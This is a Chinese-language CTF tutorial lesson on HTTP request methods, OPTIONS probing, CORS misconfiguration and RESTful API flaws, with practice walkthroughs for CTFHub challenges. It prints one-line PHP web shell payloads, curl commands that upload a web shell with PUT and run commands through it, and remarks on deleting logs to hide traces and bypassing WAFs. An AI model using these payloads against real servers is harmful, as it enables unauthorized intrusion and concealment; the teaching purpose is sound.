# Day 7：HTTP请求方法与OPTIONS——接口安全测试

> **学习目标**：深入理解各种HTTP请求方法，掌握OPTIONS探测技术，学会利用OPTIONS泄露的信息
>
> **学习时长**：2-3小时
>
> **难度等级**：⭐⭐⭐

---

## 📚 今日内容概览

1. HTTP请求方法详解（GET/POST/PUT/DELETE等）
2. OPTIONS请求方法是什么
3. OPTIONS在CTF中的妙用
4. CORS跨域资源共享
5. 实战练习：HTTP方法探测
6. RESTful API安全
7. 常见问题解决
8. 今日总结与作业

---

## 一、HTTP请求方法详解

### 1.1 什么是HTTP请求方法

```
HTTP请求方法：
  也叫HTTP动词
  告诉服务器你想做什么
  就像你对服务员说"我要点菜"或"我要买单"

生活中理解：
  想象你去餐厅：
  - GET：看看菜单（获取信息）
  - POST：点菜（提交数据）
  - PUT：修改订单（更新数据）
  - DELETE：取消订单（删除数据）
  - OPTIONS：问问服务员有什么服务（探测）

常见HTTP方法：
  GET：获取资源
  POST：提交数据
  PUT：更新资源
  DELETE：删除资源
  HEAD：获取响应头
  OPTIONS：获取支持的方法
  PATCH：部分更新
  TRACE：回显请求（调试）
  CONNECT：建立隧道
```

### 1.2 GET方法

```
GET方法：
  用于获取资源
  参数在URL中
  可以被缓存
  有长度限制（浏览器URL长度限制）

示例：
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0
  
  GET /search?q=test HTTP/1.1
  Host: example.com
  （URL参数：?q=test）

特点：
  1. 请求参数在URL中
  2. 会被浏览器缓存
  3. 会留在浏览器历史记录中
  4. 长度有限制（约2000字符）
  
CTF中的GET：
  - 参数在URL中可见
  - 可以直接构造URL
  - 可以直接测试注入点
```

### 1.3 POST方法

```
POST方法：
  用于提交数据
  参数在请求体中
  不能被缓存
  没有长度限制

示例：
  POST /login HTTP/1.1
  Host: example.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 27
  
  username=admin&password=123
  
  或JSON格式：
  Content-Type: application/json
  {"username":"admin","password":"123"}

特点：
  1. 请求参数在请求体中
  2. 不会被浏览器缓存
  3. 不会留在浏览器历史记录中
  4. 长度没有限制

CTF中的POST：
  - 参数不在URL中
  - 需要用Burp Suite抓包修改
  - 常用于登录、注册、提交表单
```

### 1.4 PUT方法

```
PUT方法：
  用于上传文件
  将文件放在指定位置
  可以创建或覆盖文件

示例：
  PUT /uploads/shell.php HTTP/1.1
  Host: example.com
  Content-Type: application/octet-stream
  
  <?php @eval($_POST['cmd']); ?>

特点：
  1. 直接上传文件内容
  2. 可以创建新文件
  3. 可以覆盖已有文件
  4. 危险方法，服务器通常禁用

CTF中的PUT：
  - 如果服务器允许PUT方法
  - 可以直接上传WebShell
  - 获取服务器权限
```

### 1.5 DELETE方法

```
DELETE方法：
  用于删除资源
  删除指定位置的文件

示例：
  DELETE /uploads/xxx.txt HTTP/1.1
  Host: example.com

特点：
  1. 删除指定资源
  2. 可能需要认证
  3. 危险方法，服务器通常禁用

CTF中的DELETE：
  - 可以删除日志文件掩盖痕迹
  - 可以删除限制文件
  - 需要谨慎使用
```

### 1.6 HEAD方法

```
HEAD方法：
  获取响应头
  和GET类似，但不返回响应体

示例：
  HEAD /index.html HTTP/1.1
  Host: example.com
  
  响应：
  HTTP/1.1 200 OK
  Content-Type: text/html
  Content-Length: 1234
  Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT

特点：
  1. 只返回响应头
  2. 不返回响应体
  3. 比GET快
  4. 用于检查资源是否存在

CTF中的HEAD：
  - 检查资源是否存在
  - 获取文件大小
  - 获取最后修改时间
```

---

## 二、OPTIONS请求方法详解

### 2.1 什么是OPTIONS

```
OPTIONS方法：
  用于获取服务器支持的HTTP方法
  探测服务器能力
  不会执行实际操作

生活中理解：
  就像你去酒店前台问：
  "请问你们这里提供什么服务？"
  前台回答："我们有住宿、餐饮、健身房服务"

OPTIONS就是问服务器：
  "你支持哪些HTTP方法？"
  服务器回答："我支持GET、POST、HEAD"

示例：
  OPTIONS / HTTP/1.1
  Host: example.com
  
  响应：
  HTTP/1.1 200 OK
  Allow: GET, POST, HEAD, OPTIONS
  Access-Control-Allow-Methods: GET, POST, OPTIONS
  
  说明服务器支持GET、POST、HEAD、OPTIONS方法
```

### 2.2 OPTIONS响应头

```
OPTIONS响应中的关键头：

Allow：
  告诉客户端支持哪些方法
  Allow: GET, POST, HEAD, OPTIONS
  
Access-Control-Allow-Methods（CORS）：
  CORS跨域时告诉浏览器支持哪些方法
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS

Access-Control-Allow-Headers（CORS）：
  CORS跨域时告诉浏览器支持哪些头
  Access-Control-Allow-Headers: Content-Type, Authorization

Access-Control-Max-Age（CORS）：
  CORS预检请求的缓存时间
  Access-Control-Max-Age: 3600
```

### 2.3 OPTIONS在CTF中的妙用

```
CTF中的OPTIONS用法：

1. 探测支持的HTTP方法
  发送OPTIONS请求
  查看Allow头
  如果看到PUT或DELETE，可能有漏洞

2. CORS跨域信息
  查看Access-Control-Allow-*
  头可能有敏感信息
  可能存在CORS配置错误

3. 利用OPTIONS上传文件
  如果Allow包含PUT
  可以直接上传WebShell

4. 利用OPTIONS绕过限制
  某些WAF只检查GET和POST
  可以用OPTIONS方法绕过
```

---

## 三、实战练习：HTTP方法探测

### 3.1 题目1：OPTIONS探测

```
题目描述：
  Flag藏在支持的方法中

解题步骤：
  步骤1：发送OPTIONS请求
    使用curl：
    curl -X OPTIONS -v http://challenge-xxx.ctfhub.com:10800/
  
  步骤2：查看响应
    响应头显示：
    Allow: GET, POST, OPTIONS, PUT
  
  步骤3：发现PUT方法
    Allow包含PUT！
    这意味着可以上传文件
  
  步骤4：上传WebShell
    curl -X PUT -d "<?php system(\$_POST['cmd']); ?>" http://challenge-xxx.ctfhub.com:10800/shell.php
  
  步骤5：执行命令
    curl -X POST -d "cmd=ls" http://challenge-xxx.ctfhub.com:10800/shell.php
  
  步骤6：得到Flag
    在目录中找到flag文件
```

### 3.2 题目2：CORS信息泄露

```
题目描述：
  Flag在CORS响应头中

解题步骤：
  步骤1：发送OPTIONS请求
    curl -X OPTIONS -v http://challenge-xxx.ctfhub.com:10800/api
  
  步骤2：查看CORS头
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Credentials: true
    Access-Control-Allow-Headers: Authorization, flag
    flag: ctfhub{cors_leak}
  
  步骤3：得到Flag
    在响应头中发现Flag！
```

### 3.3 题目3：修改请求方法

```
题目描述：
  某个页面禁止GET访问

解题步骤：
  步骤1：尝试GET访问
    GET /admin HTTP/1.1
    返回403 Forbidden
  
  步骤2：尝试POST方法
    POST /admin HTTP/1.1
    返回200 OK
  
  步骤3：获取Flag
    POST /admin HTTP/1.1
    返回flag{change_method}
```

---

## 四、CORS跨域资源共享

### 4.1 什么是CORS

```
CORS是什么：
  Cross-Origin Resource Sharing
  跨域资源共享
  允许不同域名之间的资源访问

为什么要CORS：
  浏览器的同源策略：
  - 默认不允许跨域请求
  - www.a.com不能访问api.b.com
  - CORS就是来解决这个问题的

同源的定义：
  同协议 + 同域名 + 同端口 = 同源
  http://example.com:80
  http://example.com:8080 不同源（端口不同）
  https://example.com 不同源（协议不同）
  http://www.example.com 不同源（域名不同）
```

### 4.2 CORS工作原理

```
简单请求：
  浏览器自动在请求头添加Origin
  服务器检查后决定是否允许
  
  请求：
  GET /api HTTP/1.1
  Origin: http://example.com
  
  响应：
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: http://example.com
  （允许example.com跨域访问）

预检请求（Preflight）：
  复杂请求先发送OPTIONS探测
  服务器确认后才发送真正请求
  
  预检请求：
  OPTIONS /api HTTP/1.1
  Origin: http://example.com
  Access-Control-Request-Method: PUT
  
  预检响应：
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: http://example.com
  Access-Control-Allow-Methods: GET, POST, PUT
```

### 4.3 CORS安全问题

```
CORS配置错误导致的问题：

1. 允许所有域名（*）
  Access-Control-Allow-Origin: *
  任何网站都能访问这个API
  可能导致数据泄露

2. 允许携带凭证
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: *
  危险！任何网站都能获取用户凭证

3. 暴露敏感头
  Access-Control-Allow-Headers: Authorization, secret-key
  可能泄露敏感信息

CTF中的CORS：
  - 检查CORS响应头
  - 可能藏着Flag
  - 可能存在配置错误可利用
```

---

## 五、RESTful API安全

### 5.1 什么是RESTful API

```
RESTful API：
  一种API设计风格
  使用HTTP方法表示操作
  使用URL表示资源

RESTful设计原则：
  1. 使用HTTP方法：
     GET - 获取资源
     POST - 创建资源
     PUT - 更新资源
     DELETE - 删除资源
  
  2. 使用URL表示资源：
     GET /users      - 获取用户列表
     GET /users/1   - 获取ID为1的用户
     POST /users     - 创建用户
     PUT /users/1   - 更新ID为1的用户
     DELETE /users/1 - 删除ID为1的用户
  
  3. 使用JSON格式：
     Content-Type: application/json

RESTful示例：
  GET /api/articles        - 获取文章列表
  GET /api/articles/123   - 获取ID为123的文章
  POST /api/articles       - 创建文章
  PUT /api/articles/123   - 更新ID为123的文章
  DELETE /api/articles/123 - 删除ID为123的文章
```

### 5.2 RESTful API安全问题

```
常见安全问题：

1. 水平越权
  用户A访问用户B的资源
  GET /api/users/2（应该只能访问/api/users/1）
  
2. 垂直越权
  普通用户执行管理员操作
  DELETE /api/users（应该只有管理员能执行）
  
3. 资源枚举
  遍历ID获取其他用户数据
  GET /api/users/1, /api/users/2, ...

4. HTTP方法覆盖
  服务器支持PUT/DELETE
  但被WAF拦截
  使用POST方法：
  POST /api/users/1?_method=DELETE

CTF中的RESTful：
  - 尝试不同的HTTP方法
  - 尝试不同的资源ID
  - 寻找配置错误
```

---

## 六、常见问题解决

### 6.1 问题1：OPTIONS请求失败

```
现象：
  发送OPTIONS请求失败

解决方法：
  1. 检查URL是否正确
  2. 检查服务器是否在线
  3. 检查网络连接
  4. 尝试其他方法（GET/POST）
  
命令：
  curl -X OPTIONS -v http://example.com/
```

### 6.2 问题2：不知道目标支持什么方法

```
现象：
  不知道目标支持哪些HTTP方法

解决方法：
  1. 发送OPTIONS请求
     curl -X OPTIONS -v http://example.com/
  
  2. 尝试常用方法
     curl -X PUT http://example.com/
     curl -X DELETE http://example.com/
     curl -X PATCH http://example.com/
  
  3. 查看响应状态码
     405 Method Not Allowed - 不支持
     200 OK - 支持
```

---

## 七、今日总结

### 7.1 知识点回顾

```
✅ HTTP请求方法
  - GET：获取资源
  - POST：提交数据
  - PUT：上传文件
  - DELETE：删除资源
  - HEAD：获取响应头
  - OPTIONS：获取支持的方法

✅ OPTIONS探测
  - 查看Allow头
  - 查看CORS头
  - 探测服务器能力

✅ CORS跨域
  - 同源策略
  - CORS响应头
  - 配置错误利用

✅ RESTful API
  - API设计风格
  - 安全问题
```

### 7.2 关键记忆点

```
记住这个口诀：

HTTP方法要记牢，
GET取来POST交；
PUT上传DELETE删，
HEAD只看响应头；
OPTIONS探测服务器，
Allow头里藏玄机！

CORS要看响应头，
Access-Control别忘掉；
可能藏着敏感信息，
配置错误要利用！
```

### 7.3 今日作业

```
必做题：
  1. 学会使用OPTIONS探测服务器
  2. 在CTFHub完成HTTP方法相关题目（至少3道）
  3. 理解CORS原理

选做题：
  1. 练习使用不同HTTP方法
  2. 研究CORS安全问题
  3. 完成5道以上相关题目

提交内容：
  - 题目截图
  - 解决方法
  - 学到的知识点
```

### 7.4 明日预告

```
Day 8：Burp Suite Proxy——抓包拦截基础

学习内容：
  - Proxy模块详解
  - 拦截HTTP请求
  - 修改请求内容
  - 历史记录查看
```

---

**恭喜你完成Day 7的学习！明天学习Burp Suite Proxy！** 🎉
